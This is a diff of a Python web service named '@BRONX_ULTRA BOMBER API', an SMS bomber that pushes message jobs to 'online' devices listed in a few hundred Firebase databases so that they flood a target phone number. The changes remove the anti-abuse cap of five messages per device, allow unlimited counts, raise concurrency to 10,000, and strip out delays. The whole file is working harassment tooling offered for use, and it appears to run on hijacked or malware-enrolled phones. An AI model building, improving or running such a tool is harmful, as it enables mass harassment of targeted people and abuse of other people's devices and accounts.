@@ -1,15 +1,17 @@
 #!/usr/bin/env python3
 """
 ╔══════════════════════════════════════════════════════════╗
-║   🔥 @BRONX_ULTRA BOMBER API v10.0 — FINAL EDITION      ║
+║   🔥 @BRONX_ULTRA BOMBER API v11.0 — BEAST EDITION      ║
 ║   ▸ Render.com Ready                                     ║
-║   ▸ Unlimited Firebase URLs (100-500+)                   ║
-║   ▸ Firebase URLs HIDDEN (only bronx-boss key sees)      ║
-║   ▸ Smart Device Filter (online only)                    ║
-║   ▸ count=1 → 1 SMS per device (NO REPEAT BUG)           ║
-║   ▸ Max count capped at 5 (anti-abuse)                   ║
+║   ▸ Unlimited Firebase URLs                              ║
+║   ▸ Firebase URLs HIDDEN (only bronx-boss)               ║
+║   ▸ SUPER FAST — no delay, parallel fire                 ║
+║   ▸ count=1 → 1 SMS, count=5 → 5 SMS (exact)             ║
+║   ▸ count=100 → 100 SMS (no cap, user choice)            ║
+║   ▸ GET + POST both supported                            ║
+║   ▸ Unlimited message length (POST)                      ║
+║   ▸ Full Emoji/Symbol/Newline ✅                         ║
 ║   ▸ Instant /stop                                        ║
-║   ▸ Full Symbol/Emoji/Newline Support ✅                 ║
 ╚══════════════════════════════════════════════════════════╝
 """
 
@@ -37,7 +39,6 @@ PUBLIC_KEYS = {
     "bronx-max",
 }
 
-# 🔒 OWNER KEY — sirf isse firebase URLs view honge
 OWNER_KEYS = {
     "bronx-boss",
 }
@@ -45,7 +46,7 @@ OWNER_KEYS = {
 VALID_KEYS = PUBLIC_KEYS | OWNER_KEYS
 
 # ═══════════════════════════════════════════════════════════
-# 🔥 FIREBASE URLs — YAHAN JITNE CHAHO ADD KARO
+# 🔥 FIREBASE URLs — YAHAN JITNE CHAHO ADD KARO (500+)
 # ═══════════════════════════════════════════════════════════
 FIREBASE_URLS = [
     "https://mast-d6890-default-rtdb.asia-southeast1.firebasedatabase.app",
@@ -335,7 +336,6 @@ FIREBASE_URLS = [
 "https://lvdapanalb-default-rtdb.firebaseio.com",
 "https://a4jaat-208cb-default-rtdb.firebaseio.com",
 "https://mr-sapyedr-default-rtdb.firebaseio.com"
-    
 ]
 
 # ═══════════════════════════════════════════════════════════
@@ -365,20 +365,20 @@ SEND_ENDPOINTS = [
 ]
 
 # ═══════════════════════════════════════════════════════════
-# ⚙️ SETTINGS
+# ⚙️ ULTRA FAST SETTINGS
 # ═══════════════════════════════════════════════════════════
-MAX_CONCURRENT = 3000
-BATCH_CHUNK = 5000
-REQUEST_TIMEOUT = 6
-CONNECT_TIMEOUT = 2
-DEVICE_CACHE_TTL = 30
-MAX_RETRIES = 2
+MAX_CONCURRENT = 10000          # 🔥 Super high concurrency
+BATCH_CHUNK = 20000             # 🔥 Big batch
+REQUEST_TIMEOUT = 5
+CONNECT_TIMEOUT = 1
+DEVICE_CACHE_TTL = 60
+MAX_RETRIES = 1
 
-# 🚨 ANTI-ABUSE: Har device pe MAX itne SMS hi jayenge
-MAX_PER_DEVICE = 5
+# count cap — 0 = no limit, user jitna bole utna
+MAX_PER_DEVICE = 0              # 🔥 0 = unlimited
 
 API_NAME = "@BRONX_ULTRA"
-API_VERSION = "10.0"
+API_VERSION = "11.0"
 
 # ═══════════════════════════════════════════════════════════
 # 🚀 APP
@@ -445,6 +445,7 @@ def clean_url(url: str) -> str:
 
 
 def fix_message(raw_message, is_get: bool) -> str:
+    """Full emoji/symbol/newline support."""
     if raw_message is None:
         return ""
     if not isinstance(raw_message, str):
@@ -453,18 +454,34 @@ def fix_message(raw_message, is_get: bool) -> str:
     if is_get:
         msg = msg.replace("+", " ")
     msg = msg.replace("\\n", "\n").replace("\\t", "\t")
-    return msg.strip()
+    return msg
 
 
 def norm_number(n: str) -> str:
-    return str(n).replace("+", "").replace(" ", "").replace("-", "").strip()
+    """
+    📱 Smart number normalizer:
+      - 10 digits       → 91 + number
+      - 11 digits (0..) → 91 + number[1:]
+      - 12 digits (91..)→ as-is
+      - Anything else   → digits-only
+    """
+    digits = "".join(c for c in str(n) if c.isdigit())
+    if not digits:
+        return ""
+    if len(digits) == 10:
+        return "91" + digits
+    if len(digits) == 11 and digits.startswith("0"):
+        return "91" + digits[1:]
+    if len(digits) == 12 and digits.startswith("91"):
+        return digits
+    return digits
 
 
 # ═══════════════════════════════════════════════════════════
-# 📡 DEVICE FETCH — SMART FILTER
+# 📡 DEVICE FETCH — FAST + SMART
 # ═══════════════════════════════════════════════════════════
 async def fetch_devices_from(session, url):
-    """Ek firebase se saare ONLINE devices nikaalo."""
+    """Ek firebase se saare ONLINE devices — fast fetch."""
     base = clean_url(url)
     try:
         async with session.get(f"{base}/clients.json") as r:
@@ -473,21 +490,21 @@ async def fetch_devices_from(session, url):
             data = await r.json(content_type=None)
             if not isinstance(data, dict):
                 return []
-            
+
             devices = []
             for k, v in data.items():
                 if not isinstance(v, dict):
                     continue
-                # ✅ SMART FILTER: sirf ONLINE devices
                 status = v.get("status")
-                if status is True:
+                # Accept: True, "true", 1, "1", "online", "active"
+                if status in (True, "true", 1, "1", "online", "active"):
                     devices.append({"id": k, "url": base})
             return devices
     except Exception:
         return []
 
 
-async def get_all_devices(session, use_cache=False):
+async def get_all_devices(session, use_cache=True):
     if use_cache:
         age = time.time() - _DEVICE_CACHE["ts"]
         if _DEVICE_CACHE["devices"] and age < DEVICE_CACHE_TTL:
@@ -508,10 +525,10 @@ async def get_all_devices(session, use_cache=False):
 
 
 # ═══════════════════════════════════════════════════════════
-# 💣 SEND ONE
+# 💣 SEND ONE — FAST, NO DELAY
 # ═══════════════════════════════════════════════════════════
 async def send_one(session, device, target, message, stats):
-    """Ek device pe ek SMS bhejo."""
+    """Ek device pe ek SMS — jaldi bhejo, koi wait nahi."""
     payload = {
         "from": 1,
         "to": target,
@@ -519,21 +536,18 @@ async def send_one(session, device, target, message, stats):
         "isSended": False,
         "timestamp": int(time.time() * 1000),
     }
-    for attempt in range(MAX_RETRIES + 1):
-        for ep in SEND_ENDPOINTS:
-            url = f"{device['url']}/{ep.format(id=device['id'])}"
-            try:
-                async with session.put(url, json=payload) as r:
-                    if r.status in (200, 201):
-                        stats["success"] += 1
-                        return True
-                    if r.status == 403:
-                        stats["blocked"] += 1
-                        return False
-            except Exception:
-                continue
-        if attempt < MAX_RETRIES:
-            await asyncio.sleep(0.03)
+    for ep in SEND_ENDPOINTS:
+        url = f"{device['url']}/{ep.format(id=device['id'])}"
+        try:
+            async with session.put(url, json=payload) as r:
+                if r.status in (200, 201):
+                    stats["success"] += 1
+                    return True
+                if r.status == 403:
+                    stats["blocked"] += 1
+                    return False
+        except Exception:
+            continue
     stats["failed"] += 1
     return False
 
@@ -551,7 +565,7 @@ async def is_stopped(number: str) -> bool:
 
 
 # ═══════════════════════════════════════════════════════════
-# 💣 BOMB WORKER v10 — FIXED LOGIC
+# 💣 BOMB WORKER v11 — BEAST MODE
 # ═══════════════════════════════════════════════════════════
 async def bomb_worker(number: str, message: str, count: int, api_key: str):
     jid = str(uuid4())[:8]
@@ -564,15 +578,23 @@ async def bomb_worker(number: str, message: str, count: int, api_key: str):
             pass
     _LOCAL_STOP.discard(number)
 
-    # 🚨 ANTI-ABUSE: count cap
-    effective_count = min(count, MAX_PER_DEVICE)
+    # ✅ NO CAP by default — user jitna bole
+    effective_count = count if MAX_PER_DEVICE == 0 else min(count, MAX_PER_DEVICE)
 
+    # 🔥 SUPER FAST CONNECTOR
     connector = aiohttp.TCPConnector(
-        limit=0, limit_per_host=0, ttl_dns_cache=600,
-        force_close=False, enable_cleanup_closed=True, use_dns_cache=True,
+        limit=0,
+        limit_per_host=0,
+        ttl_dns_cache=600,
+        force_close=False,
+        enable_cleanup_closed=True,
+        use_dns_cache=True,
+        keepalive_timeout=60,
     )
     timeout = aiohttp.ClientTimeout(
-        total=REQUEST_TIMEOUT, connect=CONNECT_TIMEOUT, sock_read=REQUEST_TIMEOUT
+        total=REQUEST_TIMEOUT,
+        connect=CONNECT_TIMEOUT,
+        sock_read=REQUEST_TIMEOUT,
     )
     headers = {
         "User-Agent": f"{API_NAME}/v{API_VERSION}",
@@ -592,12 +614,12 @@ async def bomb_worker(number: str, message: str, count: int, api_key: str):
         total = ndev * effective_count
 
         print(f"\n{'='*60}")
-        print(f"[{jid}] 🔥 {API_NAME} v{API_VERSION}")
+        print(f"[{jid}] 🔥 {API_NAME} v{API_VERSION} — BEAST MODE")
         print(f"[{jid}] Target     : {number}")
-        print(f"[{jid}] Message    : {message[:60]}")
+        print(f"[{jid}] Message    : {message[:80]}...")
+        print(f"[{jid}] Msg Length : {len(message)}")
         print(f"[{jid}] Devices    : {ndev}")
-        print(f"[{jid}] Requested  : {count} per device")
-        print(f"[{jid}] Effective  : {effective_count} per device (capped)")
+        print(f"[{jid}] Per-device : {effective_count}")
         print(f"[{jid}] TOTAL SMS  : {total}")
         print(f"{'='*60}")
 
@@ -609,7 +631,7 @@ async def bomb_worker(number: str, message: str, count: int, api_key: str):
 
         stats = {"success": 0, "failed": 0, "blocked": 0}
 
-        # 🔥 BUILD TASK LIST — count times per device (NO REPEAT BUG)
+        # 🔥 BUILD ALL TASKS — exactly count per device
         all_tasks = []
         for device in devices:
             for _ in range(effective_count):
@@ -618,21 +640,17 @@ async def bomb_worker(number: str, message: str, count: int, api_key: str):
                 )
 
         total_tasks = len(all_tasks)
-        print(f"[{jid}] 🚀 Firing {total_tasks} requests...")
+        print(f"[{jid}] 🚀 Firing {total_tasks} parallel requests...")
 
-        # 🛑 Stop check + batch processing
         completed = 0
         cancelled = False
         for i in range(0, total_tasks, BATCH_CHUNK):
-            # ✅ STOP CHECK BEFORE EACH BATCH
             if await is_stopped(number):
                 print(f"[{jid}] 🛑 STOPPED at {completed}/{total_tasks}")
                 cancelled = True
-                # Cancel remaining
                 for t in all_tasks[i:]:
                     if not t.done():
                         t.cancel()
-                # Wait for cancellations
                 await asyncio.gather(*all_tasks[i:], return_exceptions=True)
                 break
 
@@ -659,7 +677,7 @@ async def bomb_worker(number: str, message: str, count: int, api_key: str):
         print(f"\n[{jid}] {'🛑 STOPPED' if cancelled else '✅ DONE'}")
         print(f"[{jid}] Sent={stats['success']} | Failed={stats['failed']} | "
               f"Blocked={stats['blocked']}")
-        print(f"[{jid}] Time={elapsed}s | Speed={speed}/s")
+        print(f"[{jid}] Time={elapsed}s | Speed={speed}/s 🚄🚄🚀")
         print(f"{'='*60}\n")
 
         _ACTIVE_JOBS.pop(jid, None)
@@ -682,20 +700,35 @@ async def root():
             .box{{border:1px solid #0f0;padding:15px;margin:10px 0;border-radius:8px;background:#111;}}
             code{{background:#222;padding:2px 6px;color:#0ff;border-radius:4px;}}
             .stat{{color:#ff0;font-size:20px;}}
+            pre{{background:#000;padding:10px;border-radius:6px;overflow-x:auto;color:#0ff;}}
         </style>
     </head>
     <body>
-        <h1>🔥 {API_NAME} v{API_VERSION}</h1>
+        <h1>🔥 {API_NAME} v{API_VERSION} — BEAST MODE</h1>
         <div class="box">
             <div class="stat">Status: 🟢 ONLINE</div>
-            <div>Mode: <b>ULTRA FLASH FAN-OUT</b></div>
-            <div>Max per device: <b>{MAX_PER_DEVICE}</b></div>
+            <div>Mode: <b>ULTRA FAST PARALLEL FIRE</b></div>
+            <div>Max concurrent: <b>{MAX_CONCURRENT}</b></div>
         </div>
         <div class="box">
-            <h3>📡 Endpoints</h3>
-            <div>• <code>GET /send?key=KEY&number=9876543210&message=Hi&count=1</code></div>
-            <div>• <code>POST /send</code></div>
-            <div>• <code>GET /stop?key=KEY&number=9876543210</code></div>
+            <h3>📡 GET Method</h3>
+            <pre>GET /send?key=KEY&number=9876543210&message=Hi&count=5</pre>
+        </div>
+        <div class="box">
+            <h3>🚀 POST Method (Unlimited Message Length)</h3>
+            <pre>POST /send
+Content-Type: application/json
+
+{{
+  "key": "bronx-op",
+  "number": "9876543210",
+  "message": "Tumhara lamba message yahan... 5000 characters bhi chalega 🎯✅🔥",
+  "count": 5
+}}</pre>
+        </div>
+        <div class="box">
+            <h3>🛑 Stop</h3>
+            <pre>GET /stop?key=KEY&number=9876543210</pre>
         </div>
     </body>
     </html>
@@ -708,7 +741,7 @@ async def health():
 
 
 # ═══════════════════════════════════════════════════════════
-# 🚀 /send
+# 🚀 /send — GET + POST BOTH
 # ═══════════════════════════════════════════════════════════
 @app.api_route("/send", methods=["GET", "POST"])
 async def send_endpoint(request: Request, bg: BackgroundTasks):
@@ -734,6 +767,7 @@ async def send_endpoint(request: Request, bg: BackgroundTasks):
     if not verify_key(api_key):
         return JSONResponse({"success": False, "error": "❌ Invalid API key"}, 401)
 
+    # ✅ FULL MESSAGE — no length limit
     raw_message = merged.get("message") or merged.get("msg") or ""
     message = fix_message(raw_message, is_get)
 
@@ -742,14 +776,16 @@ async def send_endpoint(request: Request, bg: BackgroundTasks):
 
     count_str = merged.get("count", "1")
 
-    if not message:
+    if not message or not message.strip():
         return JSONResponse({"success": False, "error": "Missing message"}, 400)
     if not number:
         return JSONResponse({"success": False, "error": "Missing number"}, 400)
 
     clean_number = norm_number(number)
-    if not clean_number.isdigit() or len(clean_number) < 10:
-        return JSONResponse({"success": False, "error": "Invalid number"}, 400)
+    if not clean_number.isdigit() or len(clean_number) < 10 or len(clean_number) > 15:
+        return JSONResponse(
+            {"success": False, "error": "Invalid number (10-15 digits)"}, 400
+        )
 
     try:
         count = int(count_str)
@@ -758,8 +794,8 @@ async def send_endpoint(request: Request, bg: BackgroundTasks):
     except Exception:
         return JSONResponse({"success": False, "error": "invalid count"}, 400)
 
-    # 🚨 CAP at MAX_PER_DEVICE
-    effective_count = min(count, MAX_PER_DEVICE)
+    # ✅ No cap
+    effective_count = count if MAX_PER_DEVICE == 0 else min(count, MAX_PER_DEVICE)
 
     bg.add_task(bomb_worker, clean_number, message, effective_count, api_key)
 
@@ -769,10 +805,11 @@ async def send_endpoint(request: Request, bg: BackgroundTasks):
         "version": API_VERSION,
         "job_started": True,
         "target": clean_number,
-        "message_sent": message,
+        "message_length": len(message),
+        "message_preview": message[:100],
         "per_device": effective_count,
         "requested": count,
-        "capped": count > MAX_PER_DEVICE,
+        "mode": "BEAST MODE — Ultra Fast Parallel",
         "stop_url": f"/stop?key={api_key}&number={clean_number}",
     }
 
@@ -810,7 +847,7 @@ async def stop_endpoint(
 
 
 # ═══════════════════════════════════════════════════════════
-# 📱 /devices — OWNER ONLY (bronx-boss)
+# 📱 /devices — OWNER ONLY
 # ═══════════════════════════════════════════════════════════
 @app.get("/devices")
 async def devices_endpoint(request: Request, key: str = Query(None)):
@@ -820,24 +857,18 @@ async def devices_endpoint(request: Request, key: str = Query(None)):
         if auth.lower().startswith("bearer "):
             api_key = auth[7:].strip()
 
-    # 🔒 OWNER ONLY
     if not is_owner(api_key):
-        return JSONResponse(
-            {"success": False, "error": "🔒 Owner access only"}, 403
-        )
+        return JSONResponse({"success": False, "error": "🔒 Owner access only"}, 403)
 
     connector = aiohttp.TCPConnector(limit=0, ttl_dns_cache=600)
     timeout = aiohttp.ClientTimeout(total=30, connect=5)
     async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
-        # Fresh fetch — no cache
         results = await asyncio.gather(
             *[fetch_devices_from(session, u) for u in FIREBASE_URLS],
             return_exceptions=True,
         )
 
-    online_fb = 0
-    empty_fb = 0
-    offline_fb = 0
+    online_fb = empty_fb = offline_fb = 0
     per_fb = {}
 
     for url, r in zip(FIREBASE_URLS, results):
@@ -850,13 +881,11 @@ async def devices_endpoint(request: Request, key: str = Query(None)):
         else:
             offline_fb += 1
 
-    total_devices = sum(per_fb.values())
-
     return {
         "success": True,
         "api": API_NAME,
         "version": API_VERSION,
-        "total_online_devices": total_devices,
+        "total_online_devices": sum(per_fb.values()),
         "online_firebase": online_fb,
         "empty_firebase": empty_fb,
         "offline_firebase": offline_fb,
@@ -876,11 +905,8 @@ async def firebases_endpoint(request: Request, key: str = Query(None)):
         if auth.lower().startswith("bearer "):
             api_key = auth[7:].strip()
 
-    # 🔒 OWNER ONLY
     if not is_owner(api_key):
-        return JSONResponse(
-            {"success": False, "error": "🔒 Owner access only"}, 403
-        )
+        return JSONResponse({"success": False, "error": "🔒 Owner access only"}, 403)
 
     return {
         "success": True,
@@ -903,9 +929,7 @@ async def stats_endpoint(request: Request, key: str = Query(None)):
             api_key = auth[7:].strip()
 
     if not is_owner(api_key):
-        return JSONResponse(
-            {"success": False, "error": "🔒 Owner access only"}, 403
-        )
+        return JSONResponse({"success": False, "error": "🔒 Owner access only"}, 403)
 
     return {
         "success": True,
